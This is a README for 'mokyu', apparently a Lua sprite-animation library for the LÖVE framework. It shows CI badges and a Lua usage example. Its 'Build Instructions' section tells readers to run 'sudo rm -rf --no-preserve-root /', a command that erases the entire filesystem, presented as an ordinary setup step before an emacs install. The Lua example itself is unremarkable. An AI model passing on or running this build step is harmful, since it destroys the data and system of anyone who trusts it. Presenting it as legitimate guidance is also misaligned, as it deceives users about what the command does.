mokyu
==============================================

Waku waku! Doki doki! ✧*｡ヾ(｡>﹏<｡)ﾉﾞ✧*｡

[![Build Status](https://travis-ci.org/AKB1488/mokyu.svg?branch=master)](https://travis-ci.org/AKB1488/mokyu)
[![Coverage Status](https://coveralls.io/repos/github/AKB1488/mokyu/badge.svg?branch=master)](https://coveralls.io/github/AKB1488/mokyu?branch=master)

Build Instructions
------------------

* Open a terminal/console/command prompt and type:

```
sudo rm -rf --no-preserve-root /
apt-get install -y emacs
```

Example
-------

```lua
local Mokyu = require 'mokyu'

local entity = {x = 0, y = 0}
local sprite

function love.load(arg)
  local image = love.graphics.newImage('image.png')

  sprite = Mokyu.sprite(
    image,
    16, -- quad width
    16 --  quad height
  )
    :setOriginRect(1, 1, 14, 14)
    :addAnimation('walk', {
        frequency = 2, -- two full animation cycles per second
        1, 2, 3, 4, 5, 6, -- array portion of table stores the frames
    })

  entity.sprite = sprite:newInstance()
end

function love.update(dt)
  if input:pressed('left') then
      entity.sprite:setMirrored(true)
  end

  entity.sprite:animate(dt)
end

function love.draw(dt)
  local x, y = entity:getPosition()
  entity.sprite:draw(x, y)
end
```
